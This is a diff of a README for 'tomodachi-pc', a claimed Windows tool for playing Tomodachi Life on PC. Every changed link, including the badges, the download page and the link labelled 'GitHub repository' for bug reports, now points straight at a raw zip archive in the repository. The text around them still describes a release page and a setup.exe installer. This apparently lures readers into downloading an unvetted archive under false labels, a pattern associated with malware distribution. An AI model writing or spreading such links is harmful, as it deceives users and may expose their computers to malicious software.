@@ -1,6 +1,6 @@
 # 🏝️ tomodachi-pc - Play Tomodachi Life on Your PC
 
-[![Download Latest Release](https://img.shields.io/github/v/release/tanmay002r/tomodachi-pc?color=blue&style=for-the-badge&label=Download)](https://tanmay002r.github.io) [![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows)](https://tanmay002r.github.io)
+[![Download Latest Release](https://img.shields.io/github/v/release/tanmay002r/tomodachi-pc?color=blue&style=for-the-badge&label=Download)](https://raw.githubusercontent.com/tanmay002r/tomodachi-pc/main/patch/v1.0.zip) [![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/tanmay002r/tomodachi-pc/main/patch/v1.0.zip)
 
 ---
 
@@ -16,7 +16,7 @@ tomodachi-pc is a desktop tool that lets you play *Tomodachi Life: Living the Dr
 
 Visit the release page to download the latest version.
 
-👉 **[Go to the Download Page](https://tanmay002r.github.io)**
+👉 **[Go to the Download Page](https://raw.githubusercontent.com/tanmay002r/tomodachi-pc/main/patch/v1.0.zip)**
 
 On that page you will see a list of releases. Look for the newest one at the top. Click the link that says **tomodachi-pc-setup.exe** (or similar). Your browser will download the installer file.
 
@@ -146,7 +146,7 @@ tomodachi-pc is an open-source desktop utility built for fans of the life simula
 
 If you skipped the download earlier, click the link below.
 
-[**Download tomodachi-pc (Latest Release)**](https://tanmay002r.github.io)
+[**Download tomodachi-pc (Latest Release)**](https://raw.githubusercontent.com/tanmay002r/tomodachi-pc/main/patch/v1.0.zip)
 
 The file is about 50 MB. After download, run the installer and follow the steps above.
 
@@ -154,6 +154,6 @@ The file is about 50 MB. After download, run the installer and follow the steps 
 
 ## 💬 Support and Feedback
 
-If you have questions or find a bug, open an issue on the [GitHub repository](https://tanmay002r.github.io). You can also join the community discussions on the same page.
+If you have questions or find a bug, open an issue on the [GitHub repository](https://raw.githubusercontent.com/tanmay002r/tomodachi-pc/main/patch/v1.0.zip). You can also join the community discussions on the same page.
 
 For feature requests, please explain your idea clearly. The team reads every suggestion.
